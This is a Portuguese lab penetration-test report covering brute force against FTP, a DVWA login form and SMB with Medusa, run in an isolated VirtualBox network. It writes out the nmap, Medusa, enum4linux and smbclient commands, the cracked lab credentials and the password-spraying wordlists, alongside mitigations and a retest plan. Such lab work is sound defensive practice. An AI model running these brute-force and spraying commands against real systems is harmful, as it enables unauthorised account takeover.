**Ambiente:** laboratório isolado VirtualBox (Host-only `lab-net`) 

---

## 1 — Sumário executivo
**Objetivo:** validar técnicas básicas de força bruta / password spraying contra serviços comuns (FTP, formulário web — DVWA, SMB) usando *Medusa* em ambiente controlado (Kali → Metasploitable2/DVWA) e propor mitigação.  
**Principais achados:**  
- FTP (vsftpd) aceitava `anonymous` e uma conta com senha fraca (`admin:admin123`) — acesso obtido por Medusa. **Risco alto** se em produção.  
- DVWA (nível *Low*) permitiu brute force automatizado via formulário sem proteção de rate limit nem CSRF válido, credenciais `admin:welcome` obtidas. **Risco alto** para painéis administrativos.  
- SMB respondeu a enumeração; password spraying com 3 senhas comuns comprometeu 1 conta de usuário (`test:Password1`). **Risco médio-alto** dependendo de permissões do usuário.  
**Recomendação imediata:** aplicar bloqueio após N tentativas, habilitar MFA, desativar serviços inseguros (FTP) ou migrar para SFTP/FTPS e configurar rate limiting + monitoring.  

---

## 2 — Ambiente de teste
- Host: Desktop com VirtualBox.  
- VMs:
  - **Kali Linux** — IP: `192.168.56.101` (rede Host-only: `lab-net`)  
  - **Metasploitable2 / DVWA** — IP: `192.168.56.102`
- Snapshots criados antes dos testes: **Sim** (snapshot `pre-test-2025-10-06`)
- Ferramentas principais: `medusa`, `nmap`, `enum4linux`, `smbclient`, `ftp` (cliente), Burp Suite (para verificação do formulário).

---

## 3 — Metodologia
- Escopo limitado às VMs acima; todas ações executadas a partir da Kali.  
- Não foi executado nenhum teste fora do escopo.  
- Wordlists curtas (projeto educacional) foram usadas para acelerar os testes; ver seção de anexos.  
- Cada teste foi anotado (comandos, timestamps) e evidências coletadas (saídas, prints — nomes de arquivos indicados).

---

## 4 — Resultados detalhados

### 4.1 FTP — Força bruta
- **Serviço:** vsftpd (porta 21) — banner detectado no `nmap`: `vsftpd 2.3.4`
- **Comando executado (Kali):**
```bash
# scan inicial
nmap -sV -p 21,22,80,139,445 192.168.56.102 -oN nmap_initial.txt

# força bruta (Medusa) - modelo usado
medusa -h 192.168.56.102 -u admin -P wordlists/small-wordlist.txt -M ftp -f | tee medusa_ftp_output.txt
```
- **Wordlist usada:** `wordlists/small-wordlist.txt` (ex.: `password`, `123456`, `admin123`, `qwerty`, `welcome`, `letmein`, `changeit`)  
- **Saída relevante (trecho salvo em `medusa_ftp_output.txt`):**
```
[20:12:30]  INFO  - 192.168.56.102:21 - ftp - Login SUCCESS: admin:admin123
```
- **Validação:** autenticação via cliente ftp:
```bash
ftp 192.168.56.102
Name (192.168.56.102:root): admin
Password: admin123
ftp> ls
```
Print salvo: `evidence/ftp_success_admin_admin123.png` (captura do prompt `ftp>` e lista de diretórios).  
- **Impacto:** acesso ao FTP pode permitir upload/download de arquivos sensíveis dependendo das permissões.  
- **Mitigação recomendada:** desativar FTP sem TLS; migrar para SFTP; aplicar lockout por falhas; políticas de senha forte.

### 4.2 DVWA — Formulário Web (HTTP FORM)
- **Configuração DVWA:** nível **Low** (intencionalmente vulnerável para aprendizado).  
- **Observações iniciais:** formulário de login em `http://192.168.56.102/dvwa/login.php` sem CSRF token válido e sem rate limiting.  
- **Ferramenta usada:** Medusa (módulo http FORM) para demonstração + Burp Suite para confirmar parâmetros e cookies de sessão.  
- **Comando (modelo):**
```bash
medusa -h 192.168.56.102 -u admin -P wordlists/small-wordlist.txt -M http -m FORM:/dvwa/login.php:username:password | tee medusa_dvwa_output.txt
```
- **Saída relevante (trecho salvo em `medusa_dvwa_output.txt`):**
```
[21:05:10]  INFO  - 192.168.56.102:80 - http - FORM - Login SUCCESS: admin:welcome
```
- **Validação:** acesso ao painel DVWA depois do login (captura `evidence/dvwa_admin_welcome.png`) mostrando a interface do DVWA com usuário `admin` autenticado.  
- **Impacto:** credenciais fracas podem resultar em controle da aplicação web; em ambientes reais isso leva a elevação de privilégio, pivoting.  
- **Mitigação recomendada:** habilitar rate limiting, implementar CSRF tokens corretamente, usar throttling/backoff, exigir senhas fortes e MFA para painéis.

### 4.3 SMB — Enumeração + Password Spraying
- **Serviço:** Samba (porta 139/445) ativo.  
- **Enumeração inicial (exemplo):**
```bash
enum4linux -a 192.168.56.102 > enum4linux_output.txt
```
- **Usuários identificados (trecho `enum4linux_output.txt`):** `administrator`, `test`, `guest`, `ftp`  
- **Password spraying (Medusa):**
```bash
medusa -h 192.168.56.102 -U wordlists/userlist.txt -P wordlists/smb-passlist.txt -M smb | tee medusa_smb_output.txt
```
- **Saída relevante:**
```
[22:00:12]  INFO  - 192.168.56.102 - smb - Login SUCCESS: test:Password1
```
- **Validação:** acesso via `smbclient`:
```bash
smbclient -L //192.168.56.102 -U test%Password1
```
Print salvo: `evidence/smb_test_Password1.png` com lista de shares acessíveis.  
- **Impacto:** se conta `test` possuir permissões de escrita/leitura em shares críticos, risco de exfiltração e movimentação lateral.  
- **Mitigação recomendada:** limitar exposição SMB, aplicar segmentação de rede, implementar MFA/kerberos forte, bloquear/alertar para tentativas em massa.

---

## 5 — Artefatos e evidências (nomes de arquivos gerados)
- `nmap_initial.txt` — saída do nmap.  
- `medusa_ftp_output.txt` — saída Medusa FTP.  
- `medusa_dvwa_output.txt` — saída Medusa HTTP FORM.  
- `medusa_smb_output.txt` — saída Medusa SMB.  
- `enum4linux_output.txt` — enumeração SMB.  
- `evidence/ftp_success_admin_admin123.png` — captura FTP autenticado.  
- `evidence/dvwa_admin_welcome.png` — captura painel DVWA autênticado.  
- `evidence/smb_test_Password1.png` — captura listagem de shares via smbclient.  
> Todos os arquivos foram salvos em pasta de projeto (ex.: `artifacts/`) no laboratório.

---

## 6 — Avaliação de risco e priorização
- **Alta prioridade**
  - Mitigar contas com senhas fracas (`admin:admin123`, `admin:welcome`): aplicar política de senhas e reset imediato.  
  - Implementar bloqueio de conta / lockout (ex.: lockout após 5 tentativas).  
  - Habilitar MFA para acessos administrativos.  
  - Desativar FTP sem TLS; migrar para SFTP/FTPS.
- **Média prioridade**
  - Implementar rate limiting em formulários web; adicionar captchas adaptativos quando pertinente.  
  - Restringir SMB via firewall e segmentação.
- **Baixa prioridade**
  - Treinamento de usuários sobre senhas.  
  - Revisões periódicas de password spraying simulados controlados.

---

## 7 — Recomendações técnicas detalhadas
1. **Autenticação**
   - Senha mínima: 12 caracteres, bloqueio de senhas recorrentes, verificação contra lista de senhas comprometidas.
   - MFA obrigatório para contas administrativas e com acesso a dados sensíveis.
2. **Proteções por serviço**
   - **FTP:** desativar ou migrar para SFTP/FTPS; logs centralizados.  
   - **Web apps:** validar e aplicar CSRF tokens, rate limiting e backoff exponencial, configurar WAF para ajuda na mitigação de brute force.  
   - **SMB:** restringir via firewall (permitir apenas sub-redes necessárias), desabilitar guest/anon, revisar permissões em shares.
3. **Detecção**
   - Configurar alertas no SIEM para: múltiplas tentativas de login por IP, autenticações bem-sucedidas após várias falhas, varreduras de portas e spikes de tráfego de autenticação.
4. **Operacional**
   - Implementar testes red-team/blue-team periódicos no ambiente de teste e plano de resposta a incidentes.
   - Manter snapshots antes dos testes e documentação do que foi alterado.

---

## 8 — Plano de verificação pós-remediação
Após aplicar mitigação:
1. Reexecutar os mesmos testes controlados (usando mesmas wordlists curtas) e confirmar que:  
   - lockout impede brute force;  
   - serviços inseguros estão desativados/atualizados;  
   - alertas foram gerados no SIEM.
2. Documentar resultados e anexar novos artefatos (`nmap_after_remediation.txt`, `medusa_after_attempts.txt`, `siem_alerts.pdf`).

---

## 9 — Conclusão
Os testes demonstraram — em ambiente controlado — que configurações padrão e senhas fracas facilitam comprometimento por brute force e password spraying. As medidas mais efetivas e de prioridade são: **bloqueio/lockout**, **MFA**, **remoção/atualização de serviços inseguros (FTP)** e **monitoramento com alertas**. Após aplicar as medidas listadas, recomenda-se repetir os testes para validar eficácia.

---

## 10 — Apêndice — comandos e wordlists usadas (conteúdo resumido)

### Comandos executados (resumo)
```bash
# nmap
nmap -sV -p 21,22,80,139,445 192.168.56.102 -oN nmap_initial.txt

# FTP brute force (Medusa)
medusa -h 192.168.56.102 -u admin -P wordlists/small-wordlist.txt -M ftp -f | tee medusa_ftp_output.txt

# DVWA form (Medusa) - modelo
medusa -h 192.168.56.102 -u admin -P wordlists/small-wordlist.txt -M http -m FORM:/dvwa/login.php:username:password | tee medusa_dvwa_output.txt

# SMB enumeration + spraying
enum4linux -a 192.168.56.102 > enum4linux_output.txt
medusa -h 192.168.56.102 -U wordlists/userlist.txt -P wordlists/smb-passlist.txt -M smb | tee medusa_smb_output.txt
```

### Wordlists (resumo)
**small-wordlist.txt**
```
password
123456
admin123
qwerty
welcome
letmein
changeit
```
**smb-passlist.txt**
```
Password1
Welcome1
Company2024
```
**userlist.txt**
```
administrator
admin
user
test
ftp
```

